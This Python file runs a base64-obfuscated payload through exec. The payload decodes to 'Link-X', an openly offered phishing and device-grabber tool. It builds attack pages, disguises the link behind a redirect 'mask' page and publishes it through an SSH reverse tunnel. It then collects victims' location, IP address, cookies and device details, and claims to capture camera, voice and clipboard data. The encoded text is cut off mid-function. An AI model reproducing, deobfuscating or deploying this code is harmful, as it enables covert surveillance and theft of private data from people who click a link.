# Obfuscated by Mr.X
import base64
exec(base64.b64decode('IiIiCkFib3V0IFRvb2w6CiAgICBOYW1lIDogTGluay1YCiAgICBEZXNjcmlwdGlvbiA6IENhbWVyYSwgVm9pY2UsIENsaXBib2FyZCAoZXRjLi4uKSBHcmFiYmVyCiAgICBBdXRob3IgOiBNci5YCiAgICBHaXRIdWIgOiBodHRwczovL2dpdGh1Yi5jb20vV2hvbXJ4NjY2ICAKICAgIFZlcnNpb24gOiAyLjAKCk1vcmUgRGVzY3JpcHRpb246CiAgICBUaGlzIFRvb2wgY2FuIEhhY2sgYW5kIEdyYWIgZGF0YSBvZiBDYW1lcmEsIFZvaWNlLCBDbGlwYm9hcmQsIExvY2F0aW9uLgogICAgSXQgY2FuIEdyYWIgQXMgbXVjaCBpbmZvIGFzIFBvc3NpYmxlIGZyb20gVmljdGltcyBEZXZpY2UuCiAgICBBbGwgdGhpcyByZXF1aXJlcyBKdXN0IGEgTWFsaWNpb3VzIExpbmsKClR1bm5lbCBPcHRpb25zOgogICAgbG9jYWxob3N0LnJ1biAodmlhIFNTSCkKCk5vdGU6CiAgICBUaGlzIFRvb2wgaXMgb25seSBmb3IgRWR1Y2F0aW9uYWwgUHVycG9zZQogICAgTXIuWCB3aWxsIG5vdCBiZSByZXNwb25zaWJsZSBmb3IgYW55IE1pc3VzZQoiIiIKCmltcG9ydCBvcwppbXBvcnQgdGltZQppbXBvcnQgc3lzCmltcG9ydCBqc29uCmltcG9ydCBzaHV0aWwKaW1wb3J0IHN1YnByb2Nlc3MgYXMgc2IKaW1wb3J0IHJlCgojIEdsb2JhbCBWYXJpYWJsZXMKYXR0YWNrTWV0aG9kID0gIiIKbWFza1VybCA9ICIiCmhvc3QgPSAiMTI3LjAuMC4xIgpjaHJvb3QgPSBGYWxzZSBpZiAoc2IuZ2V0b3V0cHV0KCJjb21tYW5kIC12IHRlcm11eC1jaHJvb3QiKSA9PSAiIikgZWxzZSBUcnVlCnR1bm5lbF9hY3RpdmUgPSBUcnVlCgpjb2x1bW5zID0gc2h1dGlsLmdldF90ZXJtaW5hbF9zaXplKCkuY29sdW1ucwoKIyBDeWJlcnB1bmsgTmVvbiBDb2xvcnMKTkVPTl9QVVJQTEUgPSAiXDAzM1szODs1OzkzbSIKTkVPTl9CTFVFID0gIlwwMzNbMzg7NTs4MW0iCk5FT05fV0hJVEUgPSAiXDAzM1szODs1OzE1bSIKUkVTRVQgPSAiXDAzM1swbSIKCmRlZiBjUHJpbnQodGV4dCwgUmV0dXJuPUZhbHNlKToKICAgIHRleHQgPSB0ZXh0LnJlcGxhY2UoImNQdXJwbGUiLCBORU9OX1BVUlBMRSkucmVwbGFjZSgiY0JsdWUiLCBORU9OX0JMVUUpLnJlcGxhY2UoImNXaGl0ZSIsIE5FT05fV0hJVEUpCiAgICBvdXRwdXQgPSB0ZXh0ICsgUkVTRVQKICAgIGlmIFJldHVybjoKICAgICAgICByZXR1cm4gb3V0cHV0CiAgICBwcmludChvdXRwdXQpCgpkZWYgcHNiKHosIGVuZD0iXG4iKToKICAgIHogPSBjUHJpbnQoeiwgVHJ1ZSkKICAgIGZvciBwIGluIHogKyBlbmQ6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShwKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkKCmRlZiBsb2dvKCk6CiAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgIGJhbm5lciA9IGYiIiIKe05FT05fUFVSUExFfSDilojilojilZcgICAgIOKWiOKWiOKVl+KWiOKWiOKWiOKVlyAgIOKWiOKWiOKVl+KWiOKWiOKVlyAg4paI4paI4pWXICAgIOKWiOKWiOKVlyAg4paI4paI4pWXCntORU9OX1BVUlBMRX0g4paI4paI4pWRICAgICDilojilojilZHilojilojilojilojilZcgIOKWiOKWiOKVkeKVmuKWiOKWiOKVl+KWiOKWiOKVlOKVnSAgICDilZrilojilojilZfilojilojilZTilZ0Ke05FT05fQkxVRX0g4paI4paI4pWRICAgICDilojilojilZHilojilojilZTilojilojilZcg4paI4paI4pWRIOKVmuKWiOKWiOKWiOKVlOKVnSAgICAgIOKVmuKWiOKWiOKWiOKVlOKVnSAKe05FT05fQkxVRX0g4paI4paI4pWRICAgICDilojilojilZHilojilojilZHilZrilojilojilZfilojilojilZEg4paI4paI4pWU4paI4paI4pWXICAgICAg4paI4paI4pWU4paI4paI4pWXIAp7TkVPTl9QVVJQTEV9IOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkeKWiOKWiOKVkSDilZrilojilojilojilojilZHilojilojilZTilZ0g4paI4paI4pWXICAgIOKWiOKWiOKVlOKVnSDilojilojilZcKe05FT05fUFVSUExFfSDilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdICAgIOKVmuKVkOKVnSAg4pWa4pWQ4pWdCntSRVNFVH0iIiIKICAgIGZvciBsaW5lIGluIGJhbm5lci5zdHJpcCgpLnNwbGl0bGluZXMoKToKICAgICAgICBwcmludChsaW5lLmNlbnRlcihjb2x1bW5zKSkKCiAgICBzZXBfbGVuID0gbWluKGNvbHVtbnMgLSAxMCwgNTApCiAgICBzZXBhcmF0b3IgPSBORU9OX1BVUlBMRSArICLilIAiICogc2VwX2xlbiArIFJFU0VUCiAgICBwcmludChzZXBhcmF0b3IuY2VudGVyKGNvbHVtbnMpKQoKICAgIGluZm9fbGluZXMgPSBbCiAgICAgICAgZiJ7TkVPTl9CTFVFfSAgICAgICAgICAgICBBdXRob3Ige05FT05fV0hJVEV9OiB7TkVPTl9XSElURX1Nci5YIiwKICAgICAgICBmIntORU9OX0JMVUV9ICAgICAgICAgICAgIFRvb2wge05FT05fV0hJVEV9OiB7TkVPTl9XSElURX1MaW5rLVggKEhhY2sgV2l0aCBMaW5rKSIsCiAgICAgICAgZiJ7TkVPTl9CTFVFfSAgICAgICAgICAgR2l0SHViIHtORU9OX1dISVRFfToge05FT05fV0hJVEV9aHR0cHM6Ly9naXRodWIuY29tL1dob21yeDY2NiAgIiwKICAgICAgICBmIntORU9OX0JMVUV9ICAgICAgICAgICAgICAgICAgICBDb2RlciB7TkVPTl9XSElURX06IHtORU9OX1dISVRFfVdob21yeCB7TkVPTl9QVVJQTEV9djIuMCIKICAgIF0KICAgIGZvciBsaW5lIGluIGluZm9fbGluZXM6CiAgICAgICAgcHJpbnQobGluZS5jZW50ZXIoY29sdW1ucykpCgogICAgcHJpbnQoc2VwYXJhdG9yLmNlbnRlcihjb2x1bW5zKSkKCmRlZiBraWxsQWxsKCk6CiAgICBwaWRzID0gc2IuZ2V0b3V0cHV0KCJwaWRvZiBwaHAgc3NoIikuc3BsaXQoKQogICAgZm9yIHBpZCBpbiBwaWRzOgogICAgICAgIGlmIHBpZC5pc2RpZ2l0KCk6CiAgICAgICAgICAgIG9zLnN5c3RlbShmImtpbGwge3BpZH0gPiAvZGV2L251bGwgMj4mMSIpCiAgICBvcy5zeXN0ZW0oInBraWxsIC1mIGxvY2FsaG9zdC5ydW4gPiAvZGV2L251bGwgMj4mMSIpCiAgICBvcy5zeXN0ZW0oInBraWxsIC1mIHBocCA+IC9kZXYvbnVsbCAyPiYxIikKCmRlZiB1cGRhdGUoKToKICAgIHBzYigiXG4gICAgY1doaXRlW2NQdXJwbGUhY1doaXRlXSBQbGVhc2Ugd2FpdCwgQ2hlY2tpbmcgVXBkYXRlLi4uIikKICAgIHRyeToKICAgICAgICBvbGRWZXJzaW9uID0ganNvbi5sb2FkcyhvcGVuKCIudmVyc2lvbiIsICJyIikucmVhZCgpKVsidmVyc2lvbiJdCiAgICBleGNlcHQ6CiAgICAgICAgb2xkVmVyc2lvbiA9ICIxLjAiCiAgICAKICAgIHRyeToKICAgICAgICBuZXdWZXJzaW9uID0ganNvbi5sb2FkcyhzYi5nZXRvdXRwdXQoImN1cmwgLXMgXCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vV2hvbXJ4NjY2L0xpbmsteC9tYWluLy52ZXJzaW9uICBcIiIpLnJlcGxhY2UoIlxuIiwgIiIpLnN0cmlwKCkpWyJ2ZXJzaW9uIl0KICAgIGV4Y2VwdDoKICAgICAgICBjUHJpbnQoIlxuICAgIGNXaGl0ZVtjUHVycGxlIWNXaGl0ZV0gU29tZXRoaW5nIFdlbnQgV3JvbmchIikKICAgICAgICBzeXMuZXhpdCgiIikKICAgIAogICAgaWYgb2xkVmVyc2lvbiAhPSBuZXdWZXJzaW9uOgogICAgICAgIHBzYigiXG4gICAgY1doaXRlW2NQdXJwbGUhY1doaXRlXSBUb29sIFVwZGF0ZSBGb3VuZCEiKQogICAgICAgIGNQcmludCgiICAgIFshXSBVcGRhdGluZyBUb29sLi4uIikKICAgICAgICBvcy5zeXN0ZW0oImNkIC4uLyAmJiBybSAtcmYgTGluay14ICYmIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vV2hvbXJ4NjY2L0xpbmsteCAgID4gL2Rldi9udWxsIDI+JjEiKQogICAgICAgIHBzYigiXG4gICAgW2NQdXJwbGUqY1doaXRlXSBVcGRhdGUgQ29tcGxldGUhIikKICAgICAgICBwc2IoIiAgICBbY1B1cnBsZSpjV2hpdGVdIFN0YXJ0aW5nIG5ldyBWZXJzaW9uLi4uIikKICAgICAgICBvcy5zeXN0ZW0oImNkIC4uL0xpbmsteCAmJiBweXRob24gTGluay14LnB5IikKICAgIGVsc2U6CiAgICAgICAgcHNiKCJcbiAgICBjV2hpdGVbY1B1cnBsZSpjV2hpdGVdIFRvb2wgaXMgYWxyZWFkeSBVcCB0byBEYXRlISIpCiAgICAgICAgdGltZS5zbGVlcCgwLjgpCiAgICAgICAgaW5wdXQoY1ByaW50KCJcbiAgICBbY1B1cnBsZSpjV2hpdGVdIFByZXNzIEVudGVyIHRvIENvbnRpbnVlLi4uIiwgVHJ1ZSkpCgpkZWYgcHJpbnRMb2NhdGlvbih0bXApOgogICAgZGF0YSA9IGpzb24ubG9hZHModG1wKVsiaW5mbyJdCiAgICB0aW1lLnNsZWVwKDAuNCkKICAgIGNQcmludChmIlxuICAgIFtjUHVycGxlfmNXaGl0ZV0gTGF0aXR1ZGVjUHVycGxlOiBjV2hpdGV7ZGF0YVsnbGF0J119IikKICAgIGNQcmludChmIlxuICAgIFtjUHVycGxlfmNXaGl0ZV0gTG9uZ2l0dWRlY1B1cnBsZTogY1doaXRle2RhdGFbJ2xvbiddfSIpCiAgICBjUHJpbnQoZiJcbiAgICBbY1B1cnBsZX5jV2hpdGVdIEFjY3VyYWN5Y1B1cnBsZTogY1doaXRle2RhdGFbJ2FjYyddfSIpCiAgICBjUHJpbnQoZiJcbiAgICBbY1B1cnBsZX5jV2hpdGVdIEFsdGl0dWRlY1B1cnBsZTogY1doaXRle2RhdGFbJ2FsdCddfSIpCiAgICBsYXQgPSBkYXRhWydsYXQnXQogICAgbG9uID0gZGF0YVsnbG9uJ10KICAgIGNQcmludChmIlxuICAgIFtjUHVycGxlfmNXaGl0ZV0gR29vZ2xlIE1hcGNQdXJwbGU6IGNXaGl0ZWh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vbWFwcy9zZWFyY2gvP2FwaT0xJnF1ZXJ5PSAge2xhdH0se2xvbn0iKQogICAgY1ByaW50KCJcbiAgICBbY1B1cnBsZSpjV2hpdGVdIFdhaXRpbmcgZm9yIG5leHQgVmljdGltLi4uIikKCmRlZiBwcmludERldGFpbHModG1wKToKICAgIGRhdGEgPSBqc29uLmxvYWRzKHRtcClbImluZm8iXQogICAgY1ByaW50KCJcbiAgICBbY1B1cnBsZSpjV2hpdGVdIFBhcnNpbmcgRGF0YS4uLiIpCiAgICBpcCA9IGRhdGEuZ2V0KCJpcCIsICJ1bmtub3duIikucmVwbGFjZSgiXG4iLCAiIikucmVwbGFjZSgiICIsICIiKQogICAgCiAgICBpcERldGFpbHMgPSBzYi5nZXRvdXRwdXQoZiJjdXJsIC1zICdodHRwOi8vaXAtYXBpLmNvbS9qc29uL3tpcH0nIikKICAgIAogICAgY291bnRyeSA9ICJOb25lIgogICAgY2l0eSA9ICJOb25lIgogICAgY2FsbENvZGUgPSAiTm9uZSIKICAgIHRpbWVab25lID0gIk5vbmUiCiAgICBJU1AgPSAiTm9uZSIKICAgIAogICAgaWYgbm90ICgiZXJyb3IiIGluIGlwRGV0YWlscykgYW5kIGlwRGV0YWlscy5zdHJpcCgpICE9ICIiOgogICAgICAgIHRyeToKICAgICAgICAgICAgaXBEZXRhaWxzID0ganNvbi5sb2FkcyhpcERldGFpbHMpCiAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UoaXBEZXRhaWxzLCBkaWN0KSBhbmQgaXBEZXRhaWxzLmdldCgic3RhdHVzIikgPT0gInN1Y2Nlc3MiOgogICAgICAgICAgICAgICAgY291bnRyeSA9IGlwRGV0YWlscy5nZXQoImNvdW50cnkiLCAiTm9uZSIpCiAgICAgICAgICAgICAgICBjaXR5ID0gaXBEZXRhaWxzLmdldCgiY2l0eSIsICJOb25lIikKICAgICAgICAgICAgICAgIGNhbGxDb2RlID0gaXBEZXRhaWxzLmdldCgiY291bnRyeUNvZGUiLCAiTm9uZSIpCiAgICAgICAgICAgICAgICB0aW1lWm9uZSA9IGlwRGV0YWlscy5nZXQoInRpbWV6b25lIiwgIk5vbmUiKQogICAgICAgICAgICAgICAgSVNQID0gaXBEZXRhaWxzLmdldCgiaXNwIiwgIk5vbmUiKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwogICAgCiAgICBjUHJpbnQoZiJcbiAgICBbY1B1cnBsZSpjV2hpdGVdIElQIEFkZHJlc3M6IHtkYXRhLmdldCgnaXAnLCAndW5rbm93bicpfSIpCiAgICBwcmludCgiIikKICAgIGNQcmludCgiW2NQdXJwbGUqY1doaXRlXSBCYXNpYyBJbmZvIi5jZW50ZXIoY29sdW1ucykpCiAgICBwcmludCgiIikKICAgIGNQcmludChmIiAgICBbY1B1cnBsZX5jV2hpdGVdIFRpbWUgaW4gVmljdGlt4oCZcyBEZXZpY2VjUHVycGxlOiBjV2hpdGV7ZGF0YS5nZXQoJ3RpbWUnLCAnTi9BJyl9IikKICAgIGNQcmludChmIiAgICBbY1B1cnBsZX5jV2hpdGVdIERldmljZSBOYW1lY1B1cnBsZTogY1doaXRle2RhdGEuZ2V0KCdkbmFtZScsICdOL0EnKX0iKQogICAgY1ByaW50KGYiICAgIFtjUHVycGxlfmNXaGl0ZV0gQ29va2llY1B1cnBsZTogY1doaXRle2RhdGEuZ2V0KCdjb29raWUnLCAnTi9BJykudGl0bGUoKX0iKQogICAgY1ByaW50KGYiICAgIFtjUHVycGxlfmNXaGl0ZV0gVXNlciBBZ2VudGNQdXJwbGU6IGNXaGl0ZXtkYXRhLmdldCgndWEnLCAnTi9BJyl9IikKICAgIGNQcmludChmIiAgICBbY1B1cnBsZX5jV2hpdGVdIFBsYXRmb3JtY1B1cnBsZTogY1doaXRle2RhdGEuZ2V0KCdwbGF0ZicsICdOL0EnKX0iKQogICAgY1ByaW50KGYiICAgIFtjUHVycGxlfmNXaGl0ZV0gTGFuZ3VhZ2VjUHVycGxlOiBjV2hpdGV7ZGF0YS5nZXQoJ2xhbmcnLCAnTi9BJyl9IikKICAgIGNQcmludChmIiAgICBbY1B1cnBsZX5jV2hpdGVdIERldmljZSBNZW1vcnljUHVycGxlOiBjV2hpdGV7ZGF0YS5nZXQoJ21lbW9yeScsICdOL0EnKX0iKQogICAgY1ByaW50KGYiICAgIFtjUHVycGxlfmNXaGl0ZV0gQ2xpY2sgWGNQdXJwbGU6IGNXaGl0ZXtkYXRhLmdldCgnY2xpY2tYJywgJ04vQScpfSIpCiAgICBjUHJpbnQoZiIgICAgW2NQdXJwbGV+Y1doaXRlXSBDbGljayBZY1B1cnBsZTogY1doaXRle2RhdGEuZ2V0KCdjbGlja1knLCAnTi9BJyl9IikKICAgIGNQcmludChmIiAgICBbY1B1cnBsZX5jV2hpdGVdIENsaWNrIFRpbWVjUHVycGxlOiBjV2hpdGV7ZGF0YS5nZXQoJ2NsaWNrVGltZScsICdOL0EnKX0iKQogICAgcHJpbnQoIiIpCiAgICBjUHJpbnQoIltjUHVycGxlKmNXaGl0ZV0gU2NyZWVuIEluZm8iLmNlbnRlcihjb2x1bW5zKSkKICAgIHByaW50KCIiKQogICAgY1ByaW50KGYiICAgIFtjUHVycGxlfmNXaGl0ZV0gTWF4IFRvdWNoIFBvaW50c2NQdXJwbGU6IGNXaGl0ZXtkYXRhLmdldCgndG91Y2gnLCAnTi9BJyl9IikKICAgIGNQcmludChmIiAgICBbY1B1cnBsZX5jV2hpdGVdIFNjcmVlbiBXaWR0aGNQdXJwbGU6IGNXaGl0ZXtkYXRhLmdldCgnd2lkJywgJ04vQScpfSIpCiAgICBjUHJpbnQoZiIgICAgW2NQdXJwbGV+Y1doaXRlXSBTY3JlZW4gSGVpZ2h0Y1B1cnBsZTogY1doaXRle2RhdGEuZ2V0KCdoaWcnLCAnTi9BJyl9IikKICAgIHByaW50KCIiKQogICAgY1ByaW50KCJbY1B1cnBsZSpjV2hpdGVdIE5ldHdvcmsgSW5mbyIuY2VudGVyKGNvbHVtbnMpKQogICAgcHJpbnQoIiIpCiAgICBjUHJpbnQoZiIgICAgW2NQdXJwbGV+Y1doaXRlXSBEYXRhIFR5cGVjUHVycGxlOiBjV2hpdGV7ZGF0YS5nZXQoJ25ldFR5cGUnLCAnTi9BJykudGl0bGUoKX0iKQogICAgY1ByaW50KGYiICAgIFtjUHVycGxlfmNXaGl0ZV0gSVNQY1B1cnBsZTogY1doaXRle3N0cihJU1ApfSIpCiAgICBwcmludCgiIikKICAgIGNQcmludCgiW2NQdXJwbGUqY1doaXRlXSBCYXR0ZXJ5IEluZm8iLmNlbnRlcihjb2x1bW5zKSkKICAgIHByaW50KCIiKQogICAgY1ByaW50KGYiICAgIFtjUHVycGxlfmNXaGl0ZV0gQmF0dGVyeSBMZXZlbGNQdXJwbGU6IGNXaGl0ZXtkYXRhLmdldCgnYmF0TGV2ZWwnLCAnTi9BJyl9IikKICAgIGNQcmludChmIiAgICBbY1B1cnBsZX5jV2hpdGVdIENoYXJnaW5nY1B1cnBsZTogY1doaXRle2RhdGEuZ2V0KCdiYXRDaGFyZ2UnLCAnTi9BJyl9IikKICAgIHByaW50KCIiKQogICAgY1ByaW50KCJbY1B1cnBsZSpjV2hpdGVdIENvdW50cnkgSW5mbyIuY2VudGVyKGNvbHVtbnMpKQogICAgcHJpbnQoIiIpCiAgICBjUHJpbnQoZiIgICAgW2NQdXJwbGV+Y1doaXRlXSBDb3VudHJ5Y1B1cnBsZTogY1doaXRle3N0cihjb3VudHJ5KX0iKQogICAgY1ByaW50KGYiICAgIFtjUHVycGxlfmNXaGl0ZV0gQ2l0eWNQdXJwbGU6IGNXaGl0ZXtzdHIoY2l0eSl9IikKICAgIGNQcmludChmIiAgICBbY1B1cnBsZX5jV2hpdGVdIENhbGxpbmcgQ29kZWNQdXJwbGU6IGNXaGl0ZXtzdHIoY2FsbENvZGUpfSIpCiAgICBjUHJpbnQoZiIgICAgW2NQdXJwbGV+Y1doaXRlXSBUaW1lIFpvbmVjUHVycGxlOiBjV2hpdGV7c3RyKHRpbWVab25lKX0iKQogICAgY1ByaW50KCJcbiAgICBbY1B1cnBsZSpjV2hpdGVdIFdhaXRpbmcgZm9yIG5leHQgVmljdGltLi4uIikKCmRlZiBzZXR1cEZpbGVzKHJlZGlyZWN0VXJsLCB0b0NvcHk9Tm9uZSwgc2hvdz1Ob25lKToKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cygiLnNlcnZlciIpOgogICAgICAgIG9zLnN5c3RlbSgibWtkaXIgLnNlcnZlciA+IC9kZXYvbnVsbCAyPiYxIikKICAgIG9zLnN5c3RlbSgicm0gLXJmIC4vLnNlcnZlci8qID4gL2Rldi9udWxsIDI+JjEiKQoKICAgIGlmIGF0dGFja01ldGhvZCAhPSAiY2xpY2tqYWNraW5nIjoKICAgICAgICBpZiBub3QgcmVkaXJlY3RVcmwgb3IgcmVkaXJlY3RVcmwuc3RyaXAoKSA9PSAiIjoKICAgICAgICAgICAgcmVkaXJlY3RVcmwgPSAiaHR0cHM6Ly95b3UucmVnZXR0aW5nb2xkLmNvbS8gICIKICAgICAgICBlbHNlOgogICAgICAgICAgICByZWRpcmVjdFVybCA9IHJlZGlyZWN0VXJsLnN0cmlwKCkKICAgICAgICAgICAgaWYgbm90IHJlZGlyZWN0VXJsLnN0YXJ0c3dpdGgoKCJodHRwOi8vIiwgImh0dHBzOi8vIikpOgogICAgICAgICAgICAgICAgcmVkaXJlY3RVcmwgPSAiaHR0cHM6Ly8iICsgcmVkaXJlY3RVcmwKICAgICAgICAgICAgcmVkaXJlY3RVcmwgPSByZWRpcmVjdFVybC5yc3RyaXAoJy8nKSArICcvJwoKICAgICAgICBvcy5zeXN0ZW0oImNwIC1yIC4vLnNpdGUvaW5kZXgvKiAuLy5zZXJ2ZXIvIikKICAgICAgICBvcy5zeXN0ZW0oImNwIC1yIC4vLnNpdGUvanMvIiArIGF0dGFja01ldGhvZCArICIuanMgLi8uc2VydmVyL2luZGV4LmpzIikKICAgICAgICBvcy5zeXN0ZW0oImNwIC1yIC4vLnNpdGUvcGhwLyIgKyBhdHRhY2tNZXRob2QgKyAiLnBocCAuLy5zZXJ2ZXIvZ2V0X2RhdGEucGhwIikKCiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIG9wZW4oIi4vLnNlcnZlci9pbmRleC5qcyIsICJyIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgICAgIGpzRGF0YSA9IGYucmVhZCgpCiAgICAgICAgICAgIGpzRGF0YSA9IHJlLnN1YigKICAgICAgICAgICAgICAgIHIiaHR0cHM/Oi8veW91XC5yZWdldHRpbmdvbGRcLmNvbS8/IiwKICAgICAgICAgICAgICAgIHJlZGlyZWN0VXJsLAogICAgICAgICAgICAgICAganNEYXRhLAogICAgICAgICAgICAgICAgZmxhZ3M9cmUuSUdOT1JFQ0FTRQogICAgICAgICAgICApCiAgICAgICAgICAgIHdpdGggb3BlbigiLi8uc2VydmVyL2luZGV4LmpzIiwgInciLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShqc0RhdGEpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBjUHJpbnQoZiJcbiAgICBbY1B1cnBsZSFjV2hpdGVdIFdhcm5pbmc6IEZhaWxlZCB0byB1cGRhdGUgcmVkaXJlY3QgVVJMIGluIGluZGV4LmpzOiB7c3RyKGUpfSIpCgogICAgICAgIGlmIGF0dGFja01ldGhvZCA9PSAidm9pY2UiOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oIi4vLnNlcnZlci9pbmRleC5qcyIsICJyIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgICAgICAgICBqc0RhdGEgPSBmLnJlYWQoKQogICAgICAgICAgICAgICAganNEYXRhID0gcmUuc3ViKAogICAgICAgICAgICAgICAgICAgIHIncmVkaXJlY3RVcmxccyo9XHMqWyJcJ11bXiJcJ10qWyJcJ10nLAogICAgICAgICAgICAgICAgICAgIGYncmVkaXJlY3RVcmwgPSAie3JlZGlyZWN0VXJsfSInLAogICAgICAgICAgICAgICAgICAgIGpzRGF0YQogICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKCIuLy5zZXJ2ZXIvaW5kZXguanMiLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShqc0RhdGEpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIGNQcmludChmIlxuICAgIFtjUHVycGxlIWNXaGl0ZV0gV2FybmluZzogRmFpbGVkIHRvIHVwZGF0ZSByZWRpcmVjdCBVUkwgaW4gdm9pY2UuanM6IHtzdHIoZSl9IikKCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgiY3AgLXIgLi8uc2l0ZS9jbGlja2phY2tpbmcvKiAuLy5zZXJ2ZXIvIikKICAgICAgICBvcy5zeXN0ZW0oInJtIC1mIC4vLnNlcnZlci9pbmRleC5waHAiKQoKIyDinIUgVVBEQVRFRDogY3JlYXRlTWFza1BhZ2Ug4oCUIG5vdyB3b3JrcyBmb3IgY2FtZXJhIHRvbwpkZWYgY3JlYXRlTWFza1BhZ2UobWFza05hbWUsIG1haW5VcmwpOgogICAgbWFza0RpciA9ICIuLy5zZXJ2ZXIvbWFzayIKICAgIG9zLm1ha2VkaXJzKG1hc2tEaXIsIGV4aXN0X29rPVRydWUpCiAgICBtYXNrRmlsZSA9IG9zLnBhdGguam9pbihtYXNrRGlyLCBmInttYXNrTmFtZX0uaHRtbCIpCgogICAgIyBFc2NhcGUgcXVvdGVzIGZvciBKUwogICAgc2FmZVVybCA9IG1haW5VcmwucmVwbGFjZSgnIicsICdcXCInKQogICAgCiAgICBodG1sQ29udGVudCA9IGYiIiI8IURPQ1RZUEUgaHRtbD4KPGh0bWw+CjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkxvYWRpbmcuLi48L3RpdGxlPgogICAgPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMDt1cmw9e21haW5Vcmx9Ij4KICAgIDxzY3JpcHQ+CiAgICAgICAgd2luZG93LmxvY2F0aW9uLnJlcGxhY2UoIntzYWZlVXJsfSIpOwogICAgPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHk+CjwvYm9keT4KPC9odG1sPiIiIgoKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4obWFza0ZpbGUsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShodG1sQ29udGVudCkKICAgICAgICBiYXNlID0gbWFpblVybC5yc3RyaXAoJy8nKQogICAgICAgIHJldHVybiBmIntiYXNlfS9tYXNrL3ttYXNrTmFtZX0uaHRtbCIKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBjUHJpbnQoZiJcbiAgICBbY1B1cnBsZSFjV2hpdGVdIEZhaWxlZCB0byBjcmVhdGUgbWFzayBwYWdlOiB7c3RyKGUpfSIpCiAgICAgICAgcmV0dXJuIE5vbmUKCmRlZiBzdGFydFBIUCgpOgogICAgcG9ydCA9ICI4MDgwIgogICAgb3Muc3lzdGVtKGYiY2QgLi8uc2VydmVyICYmIHBocCAtUyB7aG9zdH06e3BvcnR9ID4gL2Rldi9udWxsIDI+JjEgJiIpCiAgICByZXR1cm4gcG9ydAoKZGVmIHN0YXJ0TG9jYWxob3N0UnVuKHBvcnQsIG1hc2tVcmw9Tm9uZSk6CiAgICBnbG9iYWwgdHVubmVsX2FjdGl2ZQogICAgY1ByaW50KCJcbiAgICBbY1B1cnBsZSpjV2hpdGVdIExhdW5jaGluZyBsb2NhbGhvc3QucnVuIHR1bm5lbC4uLiIpCiAgICBvcy5zeXN0ZW0oInJtIC1mIC5saHIubG9nID4gL2Rldi9udWxsIDI+JjEiKQogICAgCiAgICBzc2hfY21kID0gKAogICAgICAgIGYic3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAiCiAgICAgICAgZiItbyBTZXJ2ZXJBbGl2ZUludGVydmFsPTMwICIKICAgICAgICBmIi1vIFNlcnZlckFsaXZlQ291bnRNYXg9MyAiCiAgICAgICAgZiItUiA4MDpsb2NhbGhvc3Q6e3BvcnR9ICIKICAgICAgICBmIm5va2V5QGxvY2FsaG9zdC5ydW4gPiAubGhyLmxvZyAyPiYxICYiCiAgICApCiAgICAKICAgIGlmIGNocm9vdDoKICAgICAgICBvcy5zeXN0ZW0oZiJ0ZXJtdXgtY2hyb290IHtzc2hfY21kfSIpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbShzc2hfY21kKQogICAgCiAgICB0aW1lLnNsZWVwKDQpCiAgICBtYWluVXJsID0gIiIKICAgIGZvciBfIGluIHJhbmdlKDQwKToKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cygiLmxoci5sb2ciKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKCIubGhyLmxvZyIsICJyIikgYXMgZjoKICAgICAgICAgICAgICAgICAgICBjb250ZW50ID0gZi5yZWFkKCkKICAgICAgICAgICAgICAgICAgICBpZiAiaHR0cHM6Ly8iIGluIGNvbnRlbnQ6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIGNvbnRlbnQuc3BsaXRsaW5lcygpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgImh0dHBzOi8vIiBpbiBsaW5lIGFuZCAiLmxoci5saWZlIiBpbiBsaW5lOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1haW5VcmwgPSBsaW5lLnNwbGl0KClbMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICBpZiBtYWluVXJsOgogICAgICAgICAgICAg